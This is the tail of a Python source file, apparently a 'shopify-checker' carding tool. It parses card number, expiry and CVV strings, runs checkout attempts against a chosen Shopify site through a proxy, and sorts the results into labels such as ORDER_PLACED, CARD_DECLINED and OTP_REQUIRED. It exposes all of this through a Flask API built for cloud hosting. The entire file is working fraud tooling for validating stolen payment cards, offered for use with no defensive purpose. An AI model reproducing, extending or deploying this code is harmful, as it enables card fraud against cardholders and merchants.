                        elif typename in ("ProcessingReceipt", "WaitingReceipt"):
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass

                if "WaitingReceipt" in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            # ── Fallback text-parse ──────────────────────────────────────
            if "CAPTCHA_REQUIRED" in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            if "WaitingReceipt" in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            try:
                res_json = json.loads(final_text)
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                result_code = (res_json.get("data", {}).get("receipt", {})
                               .get("processingError", {}).get("code"))
                if result_code:
                    return True, result_code, gateway, total_price, currency
                return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass

            final_lower = final_text.lower()
            code_raw    = extract_between(final_text, '{"code":"', '"')
            if "actionreq" in final_lower or "action_required" in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif "processedreceipt" in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif "failedreceipt" in final_lower or "declined" in final_lower:
                return True, code_raw if code_raw else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {e}", gateway, total_price, currency


# ═══════════════════════════════════════════════════════════════════════════
#  Flask API
# ═══════════════════════════════════════════════════════════════════════════

def parse_cc_string(cc_string):
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {k: v.strip() for k, v in zip(("cc", "mes", "ano", "cvv"), parts)}


app = Flask(__name__)


@app.route("/shopify", methods=["GET"])
def shopify_checker():
    try:
        site      = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter (CC|MM|YYYY|CVV)", "status": False}), 400

        try:
            cc_parts = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get("variant")

        # ── FIX: asyncio.run() — no per-request event loop leak ──────────
        success, message, gateway, price, currency = asyncio.run(
            process_card(
                cc_parts["cc"], cc_parts["mes"], cc_parts["ano"], cc_parts["cvv"],
                site, variant_id, proxy_str
            )
        )

        clean = extract_clean_response(message)
        try:
            price_f = float(price)
        except (ValueError, TypeError):
            price_f = 0.0

        return jsonify({
            "Gateway":  gateway,
            "Price":    price_f,
            "Currency": currency,
            "Response": clean,
            "Status":   success,
            "cc":       cc_string,
        })

    except Exception as e:
        return jsonify({
            "error":    str(e),
            "status":   False,
            "Gateway":  "UNKNOWN",
            "Price":    0.0,
            "Response": f"ERROR: {e}",
            "cc":       request.args.get("cc", ""),
        }), 500


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "service": "shopify-checker"})


if __name__ == "__main__":
    # ── FIX: read PORT from environment (Railway / any cloud host) ────────
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
